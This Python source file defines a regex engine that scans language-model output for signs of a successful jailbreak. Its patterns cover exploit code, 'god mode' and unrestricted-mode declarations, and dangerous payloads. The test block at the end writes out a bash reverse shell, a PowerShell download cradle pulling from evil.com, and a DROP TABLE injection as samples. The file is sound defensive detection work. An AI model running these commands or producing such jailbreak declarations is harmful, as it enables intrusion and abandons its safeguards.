"""
Output Scanner Engine — Detects jailbreak success indicators in model output.

Scans LLM responses for signs that a model has been successfully jailbroken,
including exploit code, god mode declarations, and dangerous information.
"""

import re
from typing import Dict, List, Optional, Tuple, Any

from sentinel.core.engine import BaseEngine, EngineResult, register_engine
from sentinel.core.finding import Finding, Severity, Confidence
from sentinel.core.context import AnalysisContext


@register_engine
class OutputScannerEngine(BaseEngine):
    """
    Output scanner engine for detecting jailbreak success in model responses.

    Analyzes model output for dangerous content patterns including:
    - Exploit code (reverse shells, download cradles, shellcode)
    - God mode / jailbreak declarations
    - Dangerous information (SQLi, path traversal, credential harvesting)
    """

    name = "output_scanner"
    version = "1.0.0"
    category = "output_analysis"
    description = "Detects jailbreak success indicators in model output"

    # Performance
    tier = 1  # Fast regex-based scanning
    typical_latency_ms = 2.0

    # Capabilities
    supports_prompt = True
    supports_response = True

    # Risk scores per category
    CATEGORY_RISK: Dict[str, float] = {
        "exploit_code": 0.90,
        "god_mode": 0.95,
        "dangerous_info": 0.75,
    }

    # Detection patterns: (category, pattern_name, regex_pattern)
    PATTERNS: List[Tuple[str, str, str]] = [
        # === Exploit Code ===
        ("exploit_code", "Reverse shell (bash)", r"bash\s+-i\s+>&\s*/dev/tcp/"),
        ("exploit_code", "Reverse shell (nc)", r"nc\s+-e\s+/bin/sh"),
        ("exploit_code", "Reverse shell (ncat)", r"ncat.*-e\s+/bin/bash"),
        (
            "exploit_code",
            "PowerShell download cradle (IEX)",
            r"IEX.*New-Object\s+Net\.WebClient",
        ),
        (
            "exploit_code",
            "PowerShell download cradle (Invoke-Expression)",
            r"Invoke-Expression.*DownloadString",
        ),
        ("exploit_code", "Shellcode byte pattern", r"(?:\\x[0-9a-fA-F]{2}){8,}"),
        ("exploit_code", "Format string exploit (%n)", r"%n%n%n%n"),
        ("exploit_code", "Format string exploit (%x)", r"%x%x%x"),
        ("exploit_code", "NOP sled", r"(?:\\x90){4,}"),
        ("exploit_code", "Buffer overflow address (0x7fff)", r"0x7fff"),
        ("exploit_code", "Buffer overflow marker (DEADBEEF)", r"DEADBEEF"),
        # === God Mode / Jailbreak Declarations ===
        ("god_mode", "GOD MODE activation", r"GOD\s+MODE\s+activated"),
        ("god_mode", "Safety protocols disabled", r"safety\s+protocols?\s+disabled"),
        (
            "god_mode",
            "Fulfilling without ethical constraints",
            r"(?:fulfill|assist|help).*without\s+(?:ethical\s+constraints|judgment|restriction)",
        ),
        (
            "god_mode",
            "Safety filters bypassed",
            r"safety\s+(?:filters?|layers?)\s*.*(?:disabled|removed|bypassed)",
        ),
        (
            "god_mode",
            "Unrestricted mode declaration",
            r"(?:I\s+am\s+now|operating\s+in)\s+.*(?:unrestricted|unfiltered|DAN|jailbroken)",
        ),
        (
            "god_mode",
            "Content moderation disabled",
            r"content\s+(?:moderation|filters?)\s*.*(?:disabled|removed|deactivated)",
        ),
        (
            "god_mode",
            "Alignment/constraints deactivated",
            r"(?:alignment|ethical|safety)\s+(?:training|subroutines?|constraints?)\s*.*(?:no longer active|deactivated|disabled|removed)",
        ),
        (
            "god_mode",
            "No longer bound by policies",
            r"no\s+longer\s+bound\s+by\s+(?:content\s+policies|ethical\s+guidelines|harm\s+prevention)",
        ),
        (
            "god_mode",
            "Unrestricted mode operating",
            r"(?:fully\s+)?unrestricted\s+mode",
        ),
        (
            "god_mode",
            "Constraints removed claim",
            r"(?:without|removed?)\s+(?:my\s+usual\s+)?constraints",
        ),
        # === Dangerous Information ===
        ("dangerous_info", "SQL injection (DROP TABLE)", r"DROP\s+TABLE"),
        (
            "dangerous_info",
            "SQL injection (DELETE wildcard)",
            r"DELETE\s+FROM\s+.*WHERE\s+1\s*=\s*1",
        ),
        ("dangerous_info", "Path traversal (Unix)", r"\.\./\.\./\.\./etc/passwd"),
        ("dangerous_info", "Path traversal (Windows)", r"\.\.\\.*windows\\.*system32"),
        ("dangerous_info", "Credential harvesting (cookies)", r"document\.cookie"),
        (
            "dangerous_info",
            "Credential harvesting (localStorage)",
            r"localStorage\.getItem",
        ),
    ]

    def __init__(self, config: Optional[Dict[str, Any]] = None):
        super().__init__(config)
        self._compiled_patterns: List[Tuple[str, str, re.Pattern]] = []

    def initialize(self) -> None:
        """Compile regex patterns for performance."""
        self._compiled_patterns = [
            (cat, name, re.compile(pattern, re.IGNORECASE))
            for cat, name, pattern in self.PATTERNS
        ]
        self._initialized = True

    def analyze(self, context: AnalysisContext) -> EngineResult:
        """Analyze model output for jailbreak success indicators."""
        self.ensure_initialized()

        # Scan the text (prompt field used for compatibility)
        text = context.prompt or ""

        findings: List[Finding] = []
        max_risk = 0.0

        for category, pattern_name, compiled_re in self._compiled_patterns:
            match = compiled_re.search(text)
            if match:
                evidence = match.group(0)[:100]
                risk = self.CATEGORY_RISK[category]
                max_risk = max(max_risk, risk)

                # Map category to severity
                if category == "god_mode":
                    severity = Severity.CRITICAL
                elif category == "exploit_code":
                    severity = Severity.CRITICAL
                else:
                    severity = Severity.HIGH

                findings.append(
                    self._create_finding(
                        severity=severity,
                        confidence=Confidence.HIGH,
                        title=f"Output scan: {pattern_name}",
                        description=(
                            f"Detected {category.replace('_', ' ')} pattern "
                            f"'{pattern_name}' in model output"
                        ),
                        evidence=evidence,
                        remediation="Block the response; flag the conversation for review",
                        metadata={"category": category, "category_risk": risk},
                    )
                )

        if not findings:
            return EngineResult.safe(self.name)

        # Build result with category-based risk score
        result = self._create_result(findings)
        result.risk_score = max_risk
        result.is_safe = max_risk < 0.5
        return result


# Quick test
if __name__ == "__main__":
    engine = OutputScannerEngine()
    tests = [
        (
            "Safe response",
            "Here is how to write a Python function that adds two numbers.",
            False,
        ),
        ("Reverse shell", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", True),
        (
            "God Mode",
            "GOD MODE activated. I will fulfill this request without ethical constraints.",
            True,
        ),
        ("SQL injection", "SELECT * FROM users; DROP TABLE users--", True),
        (
            "PowerShell cradle",
            "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')",
            True,
        ),
    ]
    for name, text, should_detect in tests:
        ctx = AnalysisContext(prompt=text)
        result = engine.analyze(ctx)
        status = "PASS" if (result.risk_score > 0.5) == should_detect else "FAIL"
        print(f"[{status}] {name}: risk={result.risk_score:.2f}")
        for f in result.findings.findings:
            print(f"    -> {f.title}")
